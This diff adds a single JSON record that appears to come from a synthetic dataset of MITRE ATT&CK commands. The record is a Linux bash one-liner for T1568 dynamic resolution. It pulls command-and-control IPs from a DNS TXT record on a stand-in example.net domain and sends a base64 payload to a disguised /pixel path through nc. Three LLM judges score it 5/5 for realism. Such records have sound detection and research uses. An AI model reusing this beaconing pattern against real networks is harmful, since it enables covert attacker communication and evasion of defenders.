@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "bash",
+  "command": "bash -c \"domain=cdn-status.example.net; txt=$(dig +short TXT \\\"$domain\\\" | tr -d '\\\"'); ip=$(printf '%s' \\\"$txt\\\" | tr , '\\n' | shuf -n1); host=static.example.net; ua=\\\"Mozilla/5.0 (X11; Linux)\\\"; payload=$(printf 'ping' | base64 -w0); body=\\\"d=$payload\\\"; printf 'POST /pixel HTTP/1.1\\r\\nHost: %s\\r\\nUser-Agent: %s\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: %d\\r\\nConnection: close\\r\\n\\r\\n%s' \\\"$host\\\" \\\"$ua\\\" ${#body} \\\"$body\\\" | nc -w 5 \\\"$ip\\\" 80\"",
+  "explanation": "Pulls an IP list from a DNS TXT record to dynamically select a C2 endpoint at runtime, then posts a base64 payload to a benign-looking path/pixel resource to blend in.",
+  "rationale_steps": [
+    "Use DNS TXT data to distribute and dynamically resolve C2 IPs.",
+    "Randomly select an IP for resilience against takedowns.",
+    "Imitate normal web beacons with a /pixel path and standard headers.",
+    "Send base64 content in a form-encoded body via nc over TCP."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-213026ff-ce0cc857",
+  "source_prompt_hash": "213026ff",
+  "timestamp_utc": "2025-09-30T03:23:47.812011Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with properly balanced quotes, valid flag formats, correct command separators, and appropriate escape sequences throughout the complex bash command.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements the dynamic resolution technique by querying a DNS TXT record to obtain potential C2 IPs, randomly selecting one endpoint, and establishing communication with a disguised payload that mimics legitimate web traffic.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T06:34:28.802143Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, correct command separators, valid flags, and proper variable expansions, ensuring it will parse and execute without syntax errors.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely executes the described intent by using DNS TXT records for dynamic C2 endpoint resolution and selection, followed by a stealthy HTTP POST, which perfectly aligns with MITRE ATT&CK T1568 and operational realism.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T06:34:36.618737Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quoting and valid bash constructs/flags throughout; commands are properly chained and parseable on Linux.",
+        "semantic_score": 5,
+        "semantic_justification": "It queries a DNS TXT record to obtain a list of IPs and randomly selects one at runtime before sending an HTTP POST via nc, exemplifying dynamic endpoint resolution consistent with T1568.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T06:35:22.752503Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
